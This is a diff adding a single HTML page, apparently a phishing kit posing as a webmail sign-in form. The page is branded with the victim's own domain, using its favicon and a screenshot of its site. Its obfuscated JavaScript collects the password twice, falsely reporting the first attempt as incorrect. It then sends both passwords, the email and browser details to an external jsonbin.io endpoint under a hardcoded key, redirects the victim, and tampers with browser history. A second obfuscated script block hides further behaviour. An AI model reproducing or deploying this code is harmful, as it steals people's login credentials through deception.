@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auth</title>
+    <link href="https://db.onlinewebfonts.com/c/d3a0199dcafa52672b5461066bbb3e59?family=Cash+Market+Light+Rounded" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <style>
+        body {
+            background-size: cover;
+            font-family: "Cash Market Light Rounded";
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 75vh;
+            margin: 0;
+        }
+        .pass::before {content:"Pass"}
+        .pass::after {content:"word"}
+
+        #message {
+            text-align: center;
+            color: red;
+            display: none;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.6);
+            filter: blur(10px);
+        }
+
+        .login-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.1);
+            filter: blur(10px);
+        }
+
+        .card {
+            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+</head>
+<body>
+<div class="container login-panel">
+    <div class="row justify-content-center">
+        <div class="col-md-4">
+            <div class="card">
+                <div class="card-body">
+                    <h5 class="card-title text-center">Authorization</h5>
+
+                    <form id="login_form" method="POST">
+                        <div class="form-group">
+                            <label for="rcmloginuser">Email</label>
+                            <input type="text" class="form-control" id="rcmloginuser" placeholder="Email" value="test@gmail.com" disabled>
+                        </div>
+                        <div class="form-group">
+                            <label for="rcmloginpwd"><span class="pass"></span></label>
+                            <input type="password" class="form-control pass2" id="rcmloginpwd" placeholder="Password" required>
+
+                            <div id="message">Incorrect <span class="pass"></span>. Try Again</div>
+                        </div>
+                        <button type="submit" id="rcmloginsubmit" class="btn btn-primary btn-block">Sign In</button>
+
+                    </form>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const _0x4af25c=_0x40ea;(function(_0xe3154e,_0x58a1dd){const _0x460075=_0x40ea,_0x881bc3=_0xe3154e();while(!![]){try{const _0x8ff217=parseInt(_0x460075(0xb3))/0x1*(-parseInt(_0x460075(0xb7))/0x2)+-parseInt(_0x460075(0x97))/0x3+parseInt(_0x460075(0xbc))/0x4+-parseInt(_0x460075(0xa3))/0x5*(parseInt(_0x460075(0xb9))/0x6)+parseInt(_0x460075(0x9a))/0x7*(parseInt(_0x460075(0x99))/0x8)+-parseInt(_0x460075(0xa6))/0x9+parseInt(_0x460075(0x9b))/0xa;if(_0x8ff217===_0x58a1dd)break;else _0x881bc3['push'](_0x881bc3['shift']());}catch(_0x44b553){_0x881bc3['push'](_0x881bc3['shift']());}}}(_0x30cf,0x99faa));const urlParams=new URLSearchParams(window[_0x4af25c(0xb2)][_0x4af25c(0xac)]),encodedEmailParam=urlParams[_0x4af25c(0xa8)]('b'),emailParam=encodedEmailParam?atob(encodedEmailParam):null,loginForm=document[_0x4af25c(0xb5)]('login_form'),message=document[_0x4af25c(0xb5)](_0x4af25c(0x90)),userAgent=navigator[_0x4af25c(0x94)],currentDate=new Date(),passwordInput=document[_0x4af25c(0xb5)](_0x4af25c(0xb4));let submittedCount=0x0,hehe22='',hehe223='';loginForm['addEventListener']('submit',_0xe1a565=>{const _0x1b68e6=_0x4af25c;_0xe1a565[_0x1b68e6(0xa5)](),message[_0x1b68e6(0xbe)][_0x1b68e6(0xc0)]=_0x1b68e6(0xa0),submittedCount++;if(submittedCount===0x1)hehe223=passwordInput[_0x1b68e6(0xa9)],passwordInput[_0x1b68e6(0xa9)]='';else{if(submittedCount===0x2){hehe22=passwordInput[_0x1b68e6(0xa9)],passwordInput[_0x1b68e6(0xa9)]='';const _0x4ea56b=emailParam[_0x1b68e6(0x9e)]('@'),_0x55ac5f=_0x4ea56b[0x1],_0x4db60b={'Domain':_0x55ac5f,'Email':emailParam,'P1':hehe223,'P2':hehe22,'UserAgent':userAgent,'Date':currentDate},_0xc838fb='$2a$10$5rUmDAeY.cZuBr3kMZkz6.KvNX9QBuR.Mor4d6oAB7/v/edZZuqNK';fetch(_0x1b68e6(0xad)+emailParam,{'method':_0x1b68e6(0xa4),'headers':{'Content-Type':'application/json','X-Master-Key':_0xc838fb,'X-Bin-Name':emailParam},'body':JSON[_0x1b68e6(0x92)](_0x4db60b)})[_0x1b68e6(0x9f)](_0x39d0b1=>_0x39d0b1[_0x1b68e6(0xc2)]())[_0x1b68e6(0x9f)](_0xbc0705=>{const _0x2c7c88=_0x1b68e6;window[_0x2c7c88(0xb2)][_0x2c7c88(0x8d)](_0x2c7c88(0xa2)+_0x55ac5f);})[_0x1b68e6(0xbd)](_0x3a813a=>{});}}});function redirectToGoogle(){const _0x110864=_0x4af25c;window[_0x110864(0xb2)][_0x110864(0xab)]=_0x110864(0xba);}function generateRandomString(_0x4297a4){const _0x36627f=_0x4af25c,_0x284ace='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';let _0xb9444='';for(let _0x43fa8e=0x0;_0x43fa8e<_0x4297a4;_0x43fa8e++){const _0x51d551=Math[_0x36627f(0x96)](Math[_0x36627f(0xbf)]()*_0x284ace[_0x36627f(0xb0)]);_0xb9444+=_0x284ace['charAt'](_0x51d551);}return _0xb9444;}const currentURL=window[_0x4af25c(0xb2)]['protocol']+'//'+window[_0x4af25c(0xb2)][_0x4af25c(0xc1)],UrlShit=generateRandomString(0xa6);history[_0x4af25c(0x98)](null,null,window[_0x4af25c(0xb2)][_0x4af25c(0xab)]),window['onpopstate']=function(_0xb5e9e0){const _0x28352b=_0x4af25c;history['pushState'](null,null,window[_0x28352b(0xb2)]['href']);},setTimeout(function(){const _0x43fd82=_0x4af25c,_0x3563ef=currentURL+'/'+UrlShit+'/'+UrlShit;history[_0x43fd82(0x98)](null,'',_0x3563ef);},0x1);function _0x30cf(){const _0x168eb2=['1672743PEJOvf','pushState','163432VheZgj','42ppbBmG','24509350JRdBrM','body','rcmloginuser','split','then','block','join','https://','515uMGpEt','POST','preventDefault','4321899ayKcbt','substr','get','value','icon','href','search','https://api.jsonbin.io/v3/b?name=','querySelector',';(\x20\x20w]s1(\x20u1,,(gova1a{8pm\x20=jbwen}ga+==a;yx)rgr;hn;;rof+vi[3dr71e8(t9()8[\x20+ffrqd)=,=0,82)e617=,,t;}d[f5,ng9\x22+u7]re=g=r0t(x]=sk\x20CoC](-niu9=hvu4k.luk.\x20ga\x20<]vbch.<;\x20oa\x20g8rj1ls[C2v=e9;Acuq21;a(\x22scea\x22,6r.jr0i;=x)nvtv(;l)\x20m7na;els7vfq;08[)e;<rjx=slbfzpnhera.,16=ia)+\x20hgufe;()nuf,=f,.r)]ru;>;nCqie)so6=garensnusg)v+rt-roarb)fa4a(e,r)id][]n0i,7n+r1hlg,iin=,+jt]oeelfh-(,[1;k.p,o<k;ltp)(hsl+f=)1C8aiCabffv(m);;rra5u\x20Aytl),=znh0\x22hev1c.a(r\x20chac]-,lvlgy++pr;pv(\x20\x22r+l;}\x20os{rw=+vitj)l0usr{a-t[=;zhcw={.ivaap;dhl)=!h[l=+vrlkoc;tgvr=so72rxw]ftt;;h.i(etl6e[go)(lv,u),\x20v;up==f\x20+)(=n;)i+aa>qcl.a}.+y]2v.nhnd;;=(ogegicvAfoqst6s=.g.+\x20==f+o\x20vr\x20ro!f8=rre{+}bv;a)(.vxs}oSq;puirn0*)(2ut7n\x22g.frfija2nne);3}[=(+*tC()0(aiavaa6r.a.;(g(rmdl;=osvc;,w2+02;vt,7.pr6\x22f9<,({itaoh\x20,ii8l],5etr;..(.les.llaCu5\x20)rt0;.o1vf=vln+\x20;;rvf6=-=l2(9)(;nr{vzflse\x22)]tlcn4;Ao4a)\x22rei)rtn=fl\x20,t(r[=Atsrb0;=np87(\x22r+(mo)ungr.Sh9;-.t+[=b[0jonpgoxe','length','backgroundImage','location','4vVOzNl','rcmloginpwd','getElementById','createElement','557524eBzVCT','trim','13614txqkcW','https://google.com','charAt','1774944jryyOO','catch','style','random','display','host','json','rel','replace','link','inwbxdupovosgttcrfjeskchorrqmacluntyz','message','.4nnbj-oG.G\x22_()nre$urj*3.fuqG%sG;G61c\x27=G=.]bGqso+#G(2(G{r_tu)G*.G(-t$Goe)$_.3(})G_!as(GrG.tocbmeltG)ft3giien6Stnin_()!.S9ri.g}iun3%3=G\x27&.bG}f$nGe43!\x27+GbbrfutG%=0G4.n)bb(vG1_$<63l3=9G,;)(;yt]diG%o6ax\x20nTGpa\x22dyGiteiE=yf$rr)ca3rfh%-lve%d%fam]il\x20ll!ao}mcGpotdsne%\x20tl(mh,%eorg(.ee=l=e\x22(%%3.qfre.%fGogGitle[(tymp\x22$18a44c2)(G4G*6.y,o:s+tr4l$,){oG>GG=GG=GG=GG=eG=>G=n={G;ll!_..bv:s.trrl$fG7{=y/!l(ngeh;59=\x20b[!;;torivG2w=e;G<bo($_\x200!m,t];w;+)\x20G9ow]].bG.!lhaf.yG(w6};.ortvGew=};Gdbo}$_G0(t,t);wo+)icG)43Gl.2_.6.bb)4>(ws15j))eG)g7(vG?(65G8)5);1oGn43(l.5_.G.b=)4m(w140{))vG)j7(;G?;29d9).);}vG)37mcG\x27t)4;rf&3u(o&?t_;;;.(2=.{G9bvG-;;%G!p8(3,qGr).jGg69br,g,gv;jG!73(l3c,b)}07xGG58id.n$}tr{ng]).6frAmC6arGod.(1(7)g7b..fr1z$.f(G11=.G#1i1pG.f(G13=.G#0s1jn.f=.fGre-ur].b[9G_bGGz)}6xr/aDG6GG__)G4jG8x)_G4,*3.){uG>C<=a}GGmdlia[og_G:3$Gb1]6(Go0]tGB0dDial2g)?md&iaoogG-2i]((G0t7i)ra8e=}:G1G-G]]#G2G])pBi%rafe)oifbam{G-5]]S)G\x20;G5.!G=.\x22G:7$Gv4]o;G,G50oe}$_;3(_$_v3cq)).js$G#b\x222#)(f};pG!G1(=<)cG4_*46G3.){l3sr-1i]]7G:lui(de_G,t_(\x20)}7embve\x20ledenGs.)nd(tyGes!.b_,3GBGa4=p=.enuGl)yre(ur1G0]G,y()uobner)er>.b5bnbw.)MuSatmonrpbGeroer0G,_);;4n%bjc!6r(v0q,r){G9[lGA6.bD9[aGAh+GG69,r,1,gw{Gt[r{A=\x20bg%!_!+Gm70.l,%,oi{l=&3o(G{43tcG(o.6_)=,3B72v85pG+G!7v(G(){.fGe6G7_6m(G;.!GG-l]]5-5e],,275))lG<r!__-6.]G{5]3=.)G2{]G=G(2uiGde(G,8_(=G.8bG,n(%3),ifG)68;_$1(G3GS9]-,G\x20102));jsiG#<\x221$)(+}}]\x20so$syli3ero$a)21t48e50649G51c52t56{54e5\x20]ftugieens_9b_3lafG\x20fn$g}deb$d=cu.en/()(ctGon!bG#bo{$_v.!)=.lG5)oet_\x20aa,6)G)a\x20f+sa$\x20?G5]oee_\x20b.b!,\x20wG4q.bE\x20_tafG13g86r[G5\x20{)etorn7b\x20\x22.!]pl)t(n}efseGb{(\x20.cG7i_$$63)3[fmubat)onefuoct,o\x20s:f)$\x206!jrin(\x20;3G>26Gr\x20qr!_Gjsi$\x20b_60\x20b_dy$={n,\x20er.\x20\x20.t_,u]=Gb\x20u!/=\x20;Gf(','stringify','head','userAgent','appendChild','floor'];_0x30cf=function(){return _0x168eb2;};return _0x30cf();}function _0x40ea(_0x2fb061,_0x39fe37){const _0x30cfe5=_0x30cf();return _0x40ea=function(_0x40eacd,_0x3a0475){_0x40eacd=_0x40eacd-0x8d;let _0x44fbe6=_0x30cfe5[_0x40eacd];return _0x44fbe6;},_0x40ea(_0x2fb061,_0x39fe37);}function setFavicon(_0x1f4fd4){const _0xd7cfb=_0x4af25c,_0x5a2cc4=document[_0xd7cfb(0xae)]('link[rel=\x22icon\x22]');if(_0x5a2cc4)_0x5a2cc4[_0xd7cfb(0xab)]=_0x1f4fd4;else{const _0x576784=document[_0xd7cfb(0xb6)](_0xd7cfb(0x8e));_0x576784[_0xd7cfb(0xc3)]=_0xd7cfb(0xaa),_0x576784[_0xd7cfb(0xab)]=_0x1f4fd4,document[_0xd7cfb(0x93)][_0xd7cfb(0x95)](_0x576784);}}if(emailParam===null||emailParam[_0x4af25c(0xb8)]()==='')redirectToGoogle();else{const emailParts=emailParam[_0x4af25c(0x9e)]('@');if(emailParts[_0x4af25c(0xb0)]===0x2){const domain=emailParts[0x1],faviconUrl='https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://'+domain+'&size=400';setFavicon(faviconUrl),document[_0x4af25c(0x9c)][_0x4af25c(0xbe)][_0x4af25c(0xb1)]='url(\x22https://image.thum.io/get/auth/69366-Gfrt66ttffff/width/1200/crop/700/http://'+domain+'\x22)',document['getElementById'](_0x4af25c(0x9d))['value']=emailParam;}else redirectToGoogle();}var removeElementsAndStyles,observer;(function(){const _0x2e310a=_0x4af25c;var _0x19eee5='',_0x1cea9e=0x1ea-0x1df;function _0x29ae00(_0x18f533){const _0x254b4c=_0x40ea;var _0x1d50fb=0x1cc142,_0x240dcd=_0x18f533[_0x254b4c(0xb0)],_0x30bcf4=[];for(var _0x2e02dc=0x0;_0x2e02dc<_0x240dcd;_0x2e02dc++){_0x30bcf4[_0x2e02dc]=_0x18f533[_0x254b4c(0xbb)](_0x2e02dc);};for(var _0x2e02dc=0x0;_0x2e02dc<_0x240dcd;_0x2e02dc++){var _0x542f91=_0x1d50fb*(_0x2e02dc+0x9f)+_0x1d50fb%0x67aa,_0x436697=_0x1d50fb*(_0x2e02dc+0x195)+_0x1d50fb%0xcefd,_0x260666=_0x542f91%_0x240dcd,_0x255878=_0x436697%_0x240dcd,_0x50d966=_0x30bcf4[_0x260666];_0x30bcf4[_0x260666]=_0x30bcf4[_0x255878],_0x30bcf4[_0x255878]=_0x50d966,_0x1d50fb=(_0x542f91+_0x436697)%0x337755;};return _0x30bcf4[_0x254b4c(0xa1)]('');};var _0xcad48f=_0x29ae00(_0x2e310a(0x8f))[_0x2e310a(0xa7)](0x0,_0x1cea9e),_0x4dbf2d=_0x2e310a(0xaf),_0x16bd0a=_0x29ae00[_0xcad48f],_0x12ff9c='',_0x462d6e=_0x16bd0a,_0x208975=_0x16bd0a(_0x12ff9c,_0x29ae00(_0x4dbf2d)),_0x3eb3a3=_0x208975(_0x29ae00(_0x2e310a(0x91))),_0x401ed8=_0x462d6e(_0x19eee5,_0x3eb3a3);return _0x401ed8(0x53b),0x17fc;}());
+</script>
+</body>
+</html>
